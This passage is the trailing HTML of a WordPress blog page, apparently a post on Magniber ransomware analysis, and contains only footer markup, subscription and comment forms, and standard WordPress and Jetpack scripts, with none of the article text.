		</li><li id="media_image-3" class="widget-container widget_media_image"><h3 class="widget-title">All my works included here are licensed under:</h3><style>.widget.widget_media_image { overflow: hidden; }.widget.widget_media_image img { height: auto; max-width: 100%; }</style><a href="http://creativecommons.org/licenses/by-sa/3.0/"><img class="image alignnone" src="https://licensebuttons.net/l/by-sa/3.0/88x31.png" alt="Creative Commons Attribution-ShareAlike 3.0 Unported License" width="88" height="31" /></a></li>			</ul>
		</div><!-- #primary .widget-area -->

	</div><!-- #main -->

	<div id="footer" role="contentinfo">
		<div id="colophon">



			<div id="site-info">
				<a href="https://hshrzd.wordpress.com/" title="hasherezade&#039;s 1001 nights" rel="home">
					hasherezade&#039;s 1001 nights				</a>
							</div><!-- #site-info -->

			<div id="site-generator">
								<a href="https://wordpress.com/?ref=footer_blog" rel="nofollow">Blog at WordPress.com.</a>
			</div><!-- #site-generator -->

		</div><!-- #colophon -->
	</div><!-- #footer -->

</div><!-- #wrapper -->

<!--  -->
<script type="text/javascript" src="//0.gravatar.com/js/hovercards/hovercards.min.js?ver=202451b213a1cbb4e3271ca470eb7790af362ac2e18ce468f8945952c7bd3456d2132e" id="grofiles-cards-js"></script>
<script type="text/javascript" id="wpgroho-js-extra">
/* <![CDATA[ */
var WPGroHo = {"my_hash":""};
/* ]]> */
</script>
<script crossorigin='anonymous' type='text/javascript'  src='https://s2.wp.com/wp-content/mu-plugins/gravatar-hovercards/wpgroho.js?m=1610363240i'></script>

	<script>
		// Initialize and attach hovercards to all gravatars
		( function() {
			function init() {
				if ( typeof Gravatar === 'undefined' ) {
					return;
				}

				if ( typeof Gravatar.init !== 'function' ) {
					return;
				}

				Gravatar.profile_cb = function ( hash, id ) {
					WPGroHo.syncProfileData( hash, id );
				};

				Gravatar.my_hash = WPGroHo.my_hash;
				Gravatar.init(
					'body',
					'#wp-admin-bar-my-account',
					{
						i18n: {
							'Edit your profile →': 'Edit your profile →',
							'View profile →': 'View profile →',
							'Contact': 'Contact',
							'Send money': 'Send money',
							'Sorry, we are unable to load this Gravatar profile.': 'Sorry, we are unable to load this Gravatar profile.',
							'Profile not found.': 'Profile not found.',
							'Too Many Requests.': 'Too Many Requests.',
							'Internal Server Error.': 'Internal Server Error.',
						},
					}
				);
			}

			if ( document.readyState !== 'loading' ) {
				init();
			} else {
				document.addEventListener( 'DOMContentLoaded', init );
			}
		} )();
	</script>

		<div style="display:none">
	<div class="grofile-hash-map-c6762d36ab89eb4f376f18b09a964a38">
	</div>
	<div class="grofile-hash-map-12181b30868ae6ea06c99a95d423c14f">
	</div>
	<div class="grofile-hash-map-84d6eb8503165fc0641c083c82a7667d">
	</div>
	</div>
	<div id="actionbar" style="display: none;"
			class="actnbr-pub-twentyten actnbr-has-follow">
		<ul>
								<li class="actnbr-btn actnbr-hidden">
						<a class="actnbr-action actnbr-actn-comment" href="https://hshrzd.wordpress.com/2023/03/30/magniber-ransomware-analysis/#comments">
							<svg class="gridicon gridicons-comment" height="20" width="20" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path d="M12 16l-5 5v-5H5c-1.1 0-2-.9-2-2V5c0-1.1.9-2 2-2h14c1.1 0 2 .9 2 2v9c0 1.1-.9 2-2 2h-7z"/></g></svg>							<span>Comment						</span>
						</a>
					</li>
									<li class="actnbr-btn actnbr-hidden">
						<a class="actnbr-action actnbr-actn-reblog" href="">
							<svg class="gridicon gridicons-reblog" height="20" width="20" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path d="M22.086 9.914L20 7.828V18c0 1.105-.895 2-2 2h-7v-2h7V7.828l-2.086 2.086L14.5 8.5 19 4l4.5 4.5-1.414 1.414zM6 16.172V6h7V4H6c-1.105 0-2 .895-2 2v10.172l-2.086-2.086L.5 15.5 5 20l4.5-4.5-1.414-1.414L6 16.172z"/></g></svg><span>Reblog</span>
						</a>
					</li>
									<li class="actnbr-btn actnbr-hidden">
								<a class="actnbr-action actnbr-actn-follow " href="">
			<svg class="gridicon" height="20" width="20" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20"><path clip-rule="evenodd" d="m4 4.5h12v6.5h1.5v-6.5-1.5h-1.5-12-1.5v1.5 10.5c0 1.1046.89543 2 2 2h7v-1.5h-7c-.27614 0-.5-.2239-.5-.5zm10.5 2h-9v1.5h9zm-5 3h-4v1.5h4zm3.5 1.5h-1v1h1zm-1-1.5h-1.5v1.5 1 1.5h1.5 1 1.5v-1.5-1-1.5h-1.5zm-2.5 2.5h-4v1.5h4zm6.5 1.25h1.5v2.25h2.25v1.5h-2.25v2.25h-1.5v-2.25h-2.25v-1.5h2.25z"  fill-rule="evenodd"></path></svg>
			<span>Subscribe</span>
		</a>
		<a class="actnbr-action actnbr-actn-following  no-display" href="">
			<svg class="gridicon" height="20" width="20" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20"><path fill-rule="evenodd" clip-rule="evenodd" d="M16 4.5H4V15C4 15.2761 4.22386 15.5 4.5 15.5H11.5V17H4.5C3.39543 17 2.5 16.1046 2.5 15V4.5V3H4H16H17.5V4.5V12.5H16V4.5ZM5.5 6.5H14.5V8H5.5V6.5ZM5.5 9.5H9.5V11H5.5V9.5ZM12 11H13V12H12V11ZM10.5 9.5H12H13H14.5V11V12V13.5H13H12H10.5V12V11V9.5ZM5.5 12H9.5V13.5H5.5V12Z" fill="#008A20"></path><path class="following-icon-tick" d="M13.5 16L15.5 18L19 14.5" stroke="#008A20" stroke-width="1.5"></path></svg>
			<span>Subscribed</span>
		</a>
							<div class="actnbr-popover tip tip-top-left actnbr-notice" id="follow-bubble">
							<div class="tip-arrow"></div>
							<div class="tip-inner actnbr-follow-bubble">
															<ul>
											<li class="actnbr-sitename">
			<a href="https://hshrzd.wordpress.com">
				<img loading='lazy' alt='' src='https://secure.gravatar.com/blavatar/31e419d8016bccbbb154cb29c69d6e854cc6240f389eec2f4ab031294e82963a?s=50&#038;d=https%3A%2F%2Fs2.wp.com%2Fi%2Flogo%2Fwpcom-gray-white.png' srcset='https://secure.gravatar.com/blavatar/31e419d8016bccbbb154cb29c69d6e854cc6240f389eec2f4ab031294e82963a?s=50&#038;d=https%3A%2F%2Fs2.wp.com%2Fi%2Flogo%2Fwpcom-gray-white.png 1x, https://secure.gravatar.com/blavatar/31e419d8016bccbbb154cb29c69d6e854cc6240f389eec2f4ab031294e82963a?s=75&#038;d=https%3A%2F%2Fs2.wp.com%2Fi%2Flogo%2Fwpcom-gray-white.png 1.5x, https://secure.gravatar.com/blavatar/31e419d8016bccbbb154cb29c69d6e854cc6240f389eec2f4ab031294e82963a?s=100&#038;d=https%3A%2F%2Fs2.wp.com%2Fi%2Flogo%2Fwpcom-gray-white.png 2x, https://secure.gravatar.com/blavatar/31e419d8016bccbbb154cb29c69d6e854cc6240f389eec2f4ab031294e82963a?s=150&#038;d=https%3A%2F%2Fs2.wp.com%2Fi%2Flogo%2Fwpcom-gray-white.png 3x, https://secure.gravatar.com/blavatar/31e419d8016bccbbb154cb29c69d6e854cc6240f389eec2f4ab031294e82963a?s=200&#038;d=https%3A%2F%2Fs2.wp.com%2Fi%2Flogo%2Fwpcom-gray-white.png 4x' class='avatar avatar-50' height='50' width='50' />				hasherezade&#039;s 1001 nights			</a>
		</li>
										<div class="actnbr-message no-display"></div>
									<form method="post" action="https://subscribe.wordpress.com" accept-charset="utf-8" style="display: none;">
																						<div class="actnbr-follow-count">Join 120 other subscribers</div>
																					<div>
										<input type="email" name="email" placeholder="Enter your email address" class="actnbr-email-field" aria-label="Enter your email address" />
										</div>
										<input type="hidden" name="action" value="subscribe" />
										<input type="hidden" name="blog_id" value="35018075" />
										<input type="hidden" name="source" value="https://hshrzd.wordpress.com/2023/03/30/magniber-ransomware-analysis/" />
										<input type="hidden" name="sub-type" value="actionbar-follow" />
										<input type="hidden" id="_wpnonce" name="_wpnonce" value="3ba8cf8ffc" />										<div class="actnbr-button-wrap">
											<button type="submit" value="Sign me up">
												Sign me up											</button>
										</div>
									</form>
									<li class="actnbr-login-nudge">
										<div>
											Already have a WordPress.com account? <a href="https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fhshrzd.wordpress.com%2F2023%2F03%2F30%2Fmagniber-ransomware-analysis%2F&#038;signup_flow=account">Log in now.</a>										</div>
									</li>
								</ul>
															</div>
						</div>
					</li>
							<li class="actnbr-ellipsis actnbr-hidden">
				<svg class="gridicon gridicons-ellipsis" height="24" width="24" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path d="M7 12c0 1.104-.896 2-2 2s-2-.896-2-2 .896-2 2-2 2 .896 2 2zm12-2c-1.104 0-2 .896-2 2s.896 2 2 2 2-.896 2-2-.896-2-2-2zm-7 0c-1.104 0-2 .896-2 2s.896 2 2 2 2-.896 2-2-.896-2-2-2z"/></g></svg>				<div class="actnbr-popover tip tip-top-left actnbr-more">
					<div class="tip-arrow"></div>
					<div class="tip-inner">
						<ul>
									<li class="actnbr-sitename">
			<a href="https://hshrzd.wordpress.com">
				<img loading='lazy' alt='' src='https://secure.gravatar.com/blavatar/31e419d8016bccbbb154cb29c69d6e854cc6240f389eec2f4ab031294e82963a?s=50&#038;d=https%3A%2F%2Fs2.wp.com%2Fi%2Flogo%2Fwpcom-gray-white.png' srcset='https://secure.gravatar.com/blavatar/31e419d8016bccbbb154cb29c69d6e854cc6240f389eec2f4ab031294e82963a?s=50&#038;d=https%3A%2F%2Fs2.wp.com%2Fi%2Flogo%2Fwpcom-gray-white.png 1x, https://secure.gravatar.com/blavatar/31e419d8016bccbbb154cb29c69d6e854cc6240f389eec2f4ab031294e82963a?s=75&#038;d=https%3A%2F%2Fs2.wp.com%2Fi%2Flogo%2Fwpcom-gray-white.png 1.5x, https://secure.gravatar.com/blavatar/31e419d8016bccbbb154cb29c69d6e854cc6240f389eec2f4ab031294e82963a?s=100&#038;d=https%3A%2F%2Fs2.wp.com%2Fi%2Flogo%2Fwpcom-gray-white.png 2x, https://secure.gravatar.com/blavatar/31e419d8016bccbbb154cb29c69d6e854cc6240f389eec2f4ab031294e82963a?s=150&#038;d=https%3A%2F%2Fs2.wp.com%2Fi%2Flogo%2Fwpcom-gray-white.png 3x, https://secure.gravatar.com/blavatar/31e419d8016bccbbb154cb29c69d6e854cc6240f389eec2f4ab031294e82963a?s=200&#038;d=https%3A%2F%2Fs2.wp.com%2Fi%2Flogo%2Fwpcom-gray-white.png 4x' class='avatar avatar-50' height='50' width='50' />				hasherezade&#039;s 1001 nights			</a>
		</li>
								<li class="actnbr-folded-customize">
								<a href="https://hshrzd.wordpress.com/wp-admin/customize.php?url=https%3A%2F%2Fhshrzd.wordpress.com%2F2023%2F03%2F30%2Fmagniber-ransomware-analysis%2F">
									<svg class="gridicon gridicons-customize" height="20" width="20" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path d="M2 6c0-1.505.78-3.08 2-4 0 .845.69 2 2 2 1.657 0 3 1.343 3 3 0 .386-.08.752-.212 1.09.74.594 1.476 1.19 2.19 1.81L8.9 11.98c-.62-.716-1.214-1.454-1.807-2.192C6.753 9.92 6.387 10 6 10c-2.21 0-4-1.79-4-4zm12.152 6.848l1.34-1.34c.607.304 1.283.492 2.008.492 2.485 0 4.5-2.015 4.5-4.5 0-.725-.188-1.4-.493-2.007L18 9l-2-2 3.507-3.507C18.9 3.188 18.225 3 17.5 3 15.015 3 13 5.015 13 7.5c0 .725.188 1.4.493 2.007L3 20l2 2 6.848-6.848c1.885 1.928 3.874 3.753 5.977 5.45l1.425 1.148 1.5-1.5-1.15-1.425c-1.695-2.103-3.52-4.092-5.448-5.977z"/></g></svg>									<span>Customize</span>
								</a>
							</li>
																<li class="actnbr-folded-follow">
												<a class="actnbr-action actnbr-actn-follow " href="">
			<svg class="gridicon" height="20" width="20" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20"><path clip-rule="evenodd" d="m4 4.5h12v6.5h1.5v-6.5-1.5h-1.5-12-1.5v1.5 10.5c0 1.1046.89543 2 2 2h7v-1.5h-7c-.27614 0-.5-.2239-.5-.5zm10.5 2h-9v1.5h9zm-5 3h-4v1.5h4zm3.5 1.5h-1v1h1zm-1-1.5h-1.5v1.5 1 1.5h1.5 1 1.5v-1.5-1-1.5h-1.5zm-2.5 2.5h-4v1.5h4zm6.5 1.25h1.5v2.25h2.25v1.5h-2.25v2.25h-1.5v-2.25h-2.25v-1.5h2.25z"  fill-rule="evenodd"></path></svg>
			<span>Subscribe</span>
		</a>
		<a class="actnbr-action actnbr-actn-following  no-display" href="">
			<svg class="gridicon" height="20" width="20" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20"><path fill-rule="evenodd" clip-rule="evenodd" d="M16 4.5H4V15C4 15.2761 4.22386 15.5 4.5 15.5H11.5V17H4.5C3.39543 17 2.5 16.1046 2.5 15V4.5V3H4H16H17.5V4.5V12.5H16V4.5ZM5.5 6.5H14.5V8H5.5V6.5ZM5.5 9.5H9.5V11H5.5V9.5ZM12 11H13V12H12V11ZM10.5 9.5H12H13H14.5V11V12V13.5H13H12H10.5V12V11V9.5ZM5.5 12H9.5V13.5H5.5V12Z" fill="#008A20"></path><path class="following-icon-tick" d="M13.5 16L15.5 18L19 14.5" stroke="#008A20" stroke-width="1.5"></path></svg>
			<span>Subscribed</span>
		</a>
										</li>
																	<li class="actnbr-signup"><a href="https://wordpress.com/start/">Sign up</a></li>
									<li class="actnbr-login"><a href="https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fhshrzd.wordpress.com%2F2023%2F03%2F30%2Fmagniber-ransomware-analysis%2F&#038;signup_flow=account">Log in</a></li>
																	<li class="actnbr-shortlink"><a href="https://wp.me/p2mVNF-2h7">Copy shortlink</a></li>
																	<li class="flb-report">
										<a href="https://wordpress.com/abuse/?report_url=https://hshrzd.wordpress.com/2023/03/30/magniber-ransomware-analysis/" target="_blank" rel="noopener noreferrer">
											Report this content										</a>
									</li>
																	<li class="actnbr-reader">
										<a href="https://wordpress.com/read/blogs/35018075/posts/8749">
											View post in Reader										</a>
									</li>
																	<li class="actnbr-subs">
										<a href="https://subscribe.wordpress.com/">Manage subscriptions</a>
									</li>
																		<li class="actnbr-fold"><a href="">Collapse this bar</a></li>
															</ul>
					</div>
				</div>
			</li>
		</ul>
	</div>
	
<script>
window.addEventListener( "load", function( event ) {
	var link = document.createElement( "link" );
	link.href = "https://s0.wp.com/wp-content/mu-plugins/actionbar/actionbar.css?v=20241015";
	link.type = "text/css";
	link.rel = "stylesheet";
	document.head.appendChild( link );

	var script = document.createElement( "script" );
	script.src = "https://s0.wp.com/wp-content/mu-plugins/actionbar/actionbar.js?v=20231122";
	script.defer = true;
	document.body.appendChild( script );
} );
</script>

			<div id="jp-carousel-loading-overlay">
			<div id="jp-carousel-loading-wrapper">
				<span id="jp-carousel-library-loading">&nbsp;</span>
			</div>
		</div>
		<div class="jp-carousel-overlay" style="display: none;">

		<div class="jp-carousel-container">
			<!-- The Carousel Swiper -->
			<div
				class="jp-carousel-wrap swiper-container jp-carousel-swiper-container jp-carousel-transitions"
				itemscope
				itemtype="https://schema.org/ImageGallery">
				<div class="jp-carousel swiper-wrapper"></div>
				<div class="jp-swiper-button-prev swiper-button-prev">
					<svg width="25" height="24" viewBox="0 0 25 24" fill="none" xmlns="http://www.w3.org/2000/svg">
						<mask id="maskPrev" mask-type="alpha" maskUnits="userSpaceOnUse" x="8" y="6" width="9" height="12">
							<path d="M16.2072 16.59L11.6496 12L16.2072 7.41L14.8041 6L8.8335 12L14.8041 18L16.2072 16.59Z" fill="white"/>
						</mask>
						<g mask="url(#maskPrev)">
							<rect x="0.579102" width="23.8823" height="24" fill="#FFFFFF"/>
						</g>
					</svg>
				</div>
				<div class="jp-swiper-button-next swiper-button-next">
					<svg width="25" height="24" viewBox="0 0 25 24" fill="none" xmlns="http://www.w3.org/2000/svg">
						<mask id="maskNext" mask-type="alpha" maskUnits="userSpaceOnUse" x="8" y="6" width="8" height="12">
							<path d="M8.59814 16.59L13.1557 12L8.59814 7.41L10.0012 6L15.9718 12L10.0012 18L8.59814 16.59Z" fill="white"/>
						</mask>
						<g mask="url(#maskNext)">
							<rect x="0.34375" width="23.8822" height="24" fill="#FFFFFF"/>
						</g>
					</svg>
				</div>
			</div>
			<!-- The main close buton -->
			<div class="jp-carousel-close-hint">
				<svg width="25" height="24" viewBox="0 0 25 24" fill="none" xmlns="http://www.w3.org/2000/svg">
					<mask id="maskClose" mask-type="alpha" maskUnits="userSpaceOnUse" x="5" y="5" width="15" height="14">
						<path d="M19.3166 6.41L17.9135 5L12.3509 10.59L6.78834 5L5.38525 6.41L10.9478 12L5.38525 17.59L6.78834 19L12.3509 13.41L17.9135 19L19.3166 17.59L13.754 12L19.3166 6.41Z" fill="white"/>
					</mask>
					<g mask="url(#maskClose)">
						<rect x="0.409668" width="23.8823" height="24" fill="#FFFFFF"/>
					</g>
				</svg>
			</div>
			<!-- Image info, comments and meta -->
			<div class="jp-carousel-info">
				<div class="jp-carousel-info-footer">
					<div class="jp-carousel-pagination-container">
						<div class="jp-swiper-pagination swiper-pagination"></div>
						<div class="jp-carousel-pagination"></div>
					</div>
					<div class="jp-carousel-photo-title-container">
						<h2 class="jp-carousel-photo-caption"></h2>
					</div>
					<div class="jp-carousel-photo-icons-container">
						<a href="#" class="jp-carousel-icon-btn jp-carousel-icon-info" aria-label="Toggle photo metadata visibility">
							<span class="jp-carousel-icon">
								<svg width="25" height="24" viewBox="0 0 25 24" fill="none" xmlns="http://www.w3.org/2000/svg">
									<mask id="maskInfo" mask-type="alpha" maskUnits="userSpaceOnUse" x="2" y="2" width="21" height="20">
										<path fill-rule="evenodd" clip-rule="evenodd" d="M12.7537 2C7.26076 2 2.80273 6.48 2.80273 12C2.80273 17.52 7.26076 22 12.7537 22C18.2466 22 22.7046 17.52 22.7046 12C22.7046 6.48 18.2466 2 12.7537 2ZM11.7586 7V9H13.7488V7H11.7586ZM11.7586 11V17H13.7488V11H11.7586ZM4.79292 12C4.79292 16.41 8.36531 20 12.7537 20C17.142 20 20.7144 16.41 20.7144 12C20.7144 7.59 17.142 4 12.7537 4C8.36531 4 4.79292 7.59 4.79292 12Z" fill="white"/>
									</mask>
									<g mask="url(#maskInfo)">
										<rect x="0.8125" width="23.8823" height="24" fill="#FFFFFF"/>
									</g>
								</svg>
							</span>
						</a>
												<a href="#" class="jp-carousel-icon-btn jp-carousel-icon-comments" aria-label="Toggle photo comments visibility">
							<span class="jp-carousel-icon">
								<svg width="25" height="24" viewBox="0 0 25 24" fill="none" xmlns="http://www.w3.org/2000/svg">
									<mask id="maskComments" mask-type="alpha" maskUnits="userSpaceOnUse" x="2" y="2" width="21" height="20">
										<path fill-rule="evenodd" clip-rule="evenodd" d="M4.3271 2H20.2486C21.3432 2 22.2388 2.9 22.2388 4V16C22.2388 17.1 21.3432 18 20.2486 18H6.31729L2.33691 22V4C2.33691 2.9 3.2325 2 4.3271 2ZM6.31729 16H20.2486V4H4.3271V18L6.31729 16Z" fill="white"/>
									</mask>
									<g mask="url(#maskComments)">
										<rect x="0.34668" width="23.8823" height="24" fill="#FFFFFF"/>
									</g>
								</svg>

								<span class="jp-carousel-has-comments-indicator" aria-label="This image has comments."></span>
							</span>
						</a>
											</div>
				</div>
				<div class="jp-carousel-info-extra">
					<div class="jp-carousel-info-content-wrapper">
						<div class="jp-carousel-photo-title-container">
							<h2 class="jp-carousel-photo-title"></h2>
						</div>
						<div class="jp-carousel-comments-wrapper">
															<div id="jp-carousel-comments-loading">
									<span>Loading Comments...</span>
								</div>
								<div class="jp-carousel-comments"></div>
								<div id="jp-carousel-comment-form-container">
									<span id="jp-carousel-comment-form-spinner">&nbsp;</span>
									<div id="jp-carousel-comment-post-results"></div>
																														<form id="jp-carousel-comment-form">
												<label for="jp-carousel-comment-form-comment-field" class="screen-reader-text">Write a Comment...</label>
												<textarea
													name="comment"
													class="jp-carousel-comment-form-field jp-carousel-comment-form-textarea"
													id="jp-carousel-comment-form-comment-field"
													placeholder="Write a Comment..."
												></textarea>
												<div id="jp-carousel-comment-form-submit-and-info-wrapper">
													<div id="jp-carousel-comment-form-commenting-as">
																													<fieldset>
																<label for="jp-carousel-comment-form-email-field">Email (Required)</label>
																<input type="text" name="email" class="jp-carousel-comment-form-field jp-carousel-comment-form-text-field" id="jp-carousel-comment-form-email-field" />
															</fieldset>
															<fieldset>
																<label for="jp-carousel-comment-form-author-field">Name (Required)</label>
																<input type="text" name="author" class="jp-carousel-comment-form-field jp-carousel-comment-form-text-field" id="jp-carousel-comment-form-author-field" />
															</fieldset>
															<fieldset>
																<label for="jp-carousel-comment-form-url-field">Website</label>
																<input type="text" name="url" class="jp-carousel-comment-form-field jp-carousel-comment-form-text-field" id="jp-carousel-comment-form-url-field" />
															</fieldset>
																											</div>
													<input
														type="submit"
														name="submit"
														class="jp-carousel-comment-form-button"
														id="jp-carousel-comment-form-button-submit"
														value="Post Comment" />
												</div>
											</form>
																											</div>
													</div>
						<div class="jp-carousel-image-meta">
							<div class="jp-carousel-title-and-caption">
								<div class="jp-carousel-photo-info">
									<h3 class="jp-carousel-caption" itemprop="caption description"></h3>
								</div>

								<div class="jp-carousel-photo-description"></div>
							</div>
							<ul class="jp-carousel-image-exif" style="display: none;"></ul>
							<a class="jp-carousel-image-download" href="#" target="_blank" style="display: none;">
								<svg width="25" height="24" viewBox="0 0 25 24" fill="none" xmlns="http://www.w3.org/2000/svg">
									<mask id="mask0" mask-type="alpha" maskUnits="userSpaceOnUse" x="3" y="3" width="19" height="18">
										<path fill-rule="evenodd" clip-rule="evenodd" d="M5.84615 5V19H19.7775V12H21.7677V19C21.7677 20.1 20.8721 21 19.7775 21H5.84615C4.74159 21 3.85596 20.1 3.85596 19V5C3.85596 3.9 4.74159 3 5.84615 3H12.8118V5H5.84615ZM14.802 5V3H21.7677V10H19.7775V6.41L9.99569 16.24L8.59261 14.83L18.3744 5H14.802Z" fill="white"/>
									</mask>
									<g mask="url(#mask0)">
										<rect x="0.870605" width="23.8823" height="24" fill="#FFFFFF"/>
									</g>
								</svg>
								<span class="jp-carousel-download-text"></span>
							</a>
							<div class="jp-carousel-image-map" style="display: none;"></div>
						</div>
					</div>
				</div>
			</div>
		</div>

		</div>
		
	<script type="text/javascript">
		window.WPCOM_sharing_counts = {"https:\/\/hshrzd.wordpress.com\/2023\/03\/30\/magniber-ransomware-analysis\/":8749};
	</script>
				<link rel='stylesheet' id='jetpack-gist-styling-css' href='https://github.githubassets.com/assets/gist-embed-9eb50564113f.css?ver=14.2-a.4' media='all' />
<link crossorigin='anonymous' rel='stylesheet' id='all-css-2-2' href='https://s0.wp.com/_static/??-eJyljEsKgDAMBS9kDUUquhDPom0Qaz/BNHh9KdgTuBl4w2PgIWVzKpgKRFEU5DgTg8dCm72+DTHnCicBGex2Z2EMwM9JeKtdkgvYW+YOftTaqYkaXOOix8noQU+z8S9MR0BZ&cssminify=yes' type='text/css' media='all' />
<script type="text/javascript" id="coblocks-loader-js-extra">
/* <![CDATA[ */
var wpcom_coblocks_js = {"coblocks_masonry_js":"https:\/\/s2.wp.com\/wp-content\/plugins\/coblocks\/2.18.1-simple-rev.4\/dist\/js\/coblocks-masonry.min.js","coblocks_lightbox_js":"https:\/\/s2.wp.com\/wp-content\/plugins\/coblocks\/2.18.1-simple-rev.4\/dist\/js\/coblocks-lightbox.min.js","jquery_core_js":"\/wp-includes\/js\/jquery\/jquery.min.js","jquery_migrate_js":"\/wp-includes\/js\/jquery\/jquery-migrate.min.js","masonry_js":"\/wp-includes\/js\/masonry.min.js","imagesloaded_js":"\/wp-includes\/js\/imagesloaded.min.js"};
var coblocksLigthboxData = {"closeLabel":"Close Gallery","leftLabel":"Previous","rightLabel":"Next"};
/* ]]> */
</script>
<script type="text/javascript" id="jetpack-carousel-js-extra">
/* <![CDATA[ */
var jetpackSwiperLibraryPath = {"url":"https:\/\/s2.wp.com\/wp-content\/mu-plugins\/jetpack-plugin\/moon\/_inc\/build\/carousel\/swiper-bundle.min.js"};
var jetpackCarouselStrings = {"widths":[370,700,1000,1200,1400,2000],"is_logged_in":"","lang":"en","ajaxurl":"https:\/\/hshrzd.wordpress.com\/wp-admin\/admin-ajax.php","nonce":"b0bf3bec23","display_exif":"1","display_comments":"1","single_image_gallery":"1","single_image_gallery_media_file":"","background_color":"black","comment":"Comment","post_comment":"Post Comment","write_comment":"Write a Comment...","loading_comments":"Loading Comments...","image_label":"Open image in full-screen.","download_original":"View full size <span class=\"photo-size\">{0}<span class=\"photo-size-times\">\u00d7<\/span>{1}<\/span>","no_comment_text":"Please be sure to submit some text with your comment.","no_comment_email":"Please provide an email address to comment.","no_comment_author":"Please provide your name to comment.","comment_post_error":"Sorry, but there was an error posting your comment. Please try again later.","comment_approved":"Your comment was approved.","comment_unapproved":"Your comment is in moderation.","camera":"Camera","aperture":"Aperture","shutter_speed":"Shutter Speed","focal_length":"Focal Length","copyright":"Copyright","comment_registration":"0","require_name_email":"1","login_url":"https:\/\/hshrzd.wordpress.com\/wp-login.php?redirect_to=https%3A%2F%2Fhshrzd.wordpress.com%2F2023%2F03%2F30%2Fmagniber-ransomware-analysis%2F","blog_id":"35018075","meta_data":["camera","aperture","shutter_speed","focal_length","copyright"],"stats_query_args":"blog=35018075&v=wpcom&tz=2&user_id=0&subd=hshrzd","is_public":"1"};
/* ]]> */
</script>
<script type="text/javascript" id="sharing-js-js-extra">
/* <![CDATA[ */
var sharing_js_options = {"lang":"en","counts":"1","is_stats_active":"1"};
/* ]]> */
</script>
<script type="text/javascript" id="verbum-settings-js-before">
/* <![CDATA[ */
window.VerbumComments = {"Log in or provide your name and email to leave a reply.":"Log in or provide your name and email to leave a reply.","Log in or provide your name and email to leave a comment.":"Log in or provide your name and email to leave a comment.","Receive web and mobile notifications for posts on this site.":"Receive web and mobile notifications for posts on this site.","Name":"Name","Email (address never made public)":"Email (address never made public)","Website (optional)":"Website (optional)","Leave a reply. (log in optional)":"Leave a reply. (log in optional)","Leave a comment. (log in optional)":"Leave a comment. (log in optional)","Log in to leave a reply.":"Log in to leave a reply.","Log in to leave a comment.":"Log in to leave a comment.","Logged in via %s":"Logged in via %s","Log out":"Log out","Email":"Email","(Address never made public)":"(Address never made public)","Instantly":"Instantly","Daily":"Daily","Reply":"Reply","Comment":"Comment","WordPress":"WordPress","Weekly":"Weekly","Notify me of new posts":"Notify me of new posts","Email me new posts":"Email me new posts","Email me new comments":"Email me new comments","Cancel":"Cancel","Write a comment...":"Write a comment...","Write a reply...":"Write a reply...","Website":"Website","Optional":"Optional","We'll keep you in the loop!":"We'll keep you in the loop!","Loading your comment...":"Loading your comment...","Discover more from":"Discover more from hasherezade's 1001 nights","Subscribe now to keep reading and get access to the full archive.":"Subscribe now to keep reading and get access to the full archive.","Continue reading":"Continue reading","Never miss a beat!":"Never miss a beat!","Interested in getting blog post updates? Simply click the button below to stay in the loop!":"Interested in getting blog post updates? Simply click the button below to stay in the loop!","Enter your email address":"Enter your email address","Subscribe":"Subscribe","Comment sent successfully":"Comment sent successfully","Save my name, email, and website in this browser for the next time I comment.":"Save my name, email, and website in this browser for the next time I comment.","siteId":35018075,"postId":8749,"mustLogIn":false,"requireNameEmail":true,"commentRegistration":false,"connectURL":"https:\/\/hshrzd.wordpress.com\/public.api\/connect\/?action=request","logoutURL":"https:\/\/hshrzd.wordpress.com\/wp-login.php?action=logout&_wpnonce=3fc39b95e5","homeURL":"https:\/\/hshrzd.wordpress.com\/","subscribeToBlog":true,"subscribeToComment":true,"isJetpackCommentsLoggedIn":false,"jetpackUsername":"","jetpackUserId":0,"jetpackSignature":"","jetpackAvatar":"https:\/\/0.gravatar.com\/avatar\/?s=96&amp;d=identicon&amp;r=G","enableBlocks":true,"enableSubscriptionModal":true,"currentLocale":"en","isJetpackComments":false,"allowedBlocks":["core\/paragraph","core\/list","core\/code","core\/list-item","core\/quote","core\/image","core\/embed","core\/quote","core\/code"],"embedNonce":"c7fc681eca","verbumBundleUrl":"https:\/\/s2.wp.com\/wp-content\/mu-plugins\/jetpack-mu-wpcom-plugin\/moon\/vendor\/automattic\/jetpack-mu-wpcom\/src\/features\/verbum-comments\/dist\/index.js","isRTL":false,"vbeCacheBuster":1721244820,"iframeUniqueId":0}
/* ]]> */
</script>
<script crossorigin='anonymous' type='text/javascript'  src='https://s0.wp.com/_static/??-eJydkd1SwyAQhV9Igm3qmBvHR3EIbNJNlh9ZaCdvL22DrWNHHa+A3Y/DOYs8BqG9S+CSnFha3yOByAxRjaUm0A2+mfhB3nA2i0B5RMeScAaW7xky7JUzBLHC6DRlU5pFVXtrT2IRAi2NRXcPMshJHsAZH0+t4GkZkOgWv2NgghSUnkUpHUN5Z22UIN5VNZWTtyol1N9wyVHLPiOZAsc+W7F6ZamYoSxmccqiFuSVuaarTqoN7Xvyema5bTZdsxGMNpQ5Rjg0u0uy6QpVrb8luw30Vga22tUq+vJN9MnVwi+yaka2kETbPF7kamGIZ9j8cLc+sc7u6/H/UXivIhhlzHLeohvXDK/2ZfPctt1Tu9t20wdN9f8K'></script>
<script type="text/javascript" id="sharing-js-js-after">
/* <![CDATA[ */
var windowOpen;
			( function () {
				function matches( el, sel ) {
					return !! (
						el.matches && el.matches( sel ) ||
						el.msMatchesSelector && el.msMatchesSelector( sel )
					);
				}

				document.body.addEventListener( 'click', function ( event ) {
					if ( ! event.target ) {
						return;
					}

					var el;
					if ( matches( event.target, 'a.share-twitter' ) ) {
						el = event.target;
					} else if ( event.target.parentNode && matches( event.target.parentNode, 'a.share-twitter' ) ) {
						el = event.target.parentNode;
					}

					if ( el ) {
						event.preventDefault();

						// If there's another sharing window open, close it.
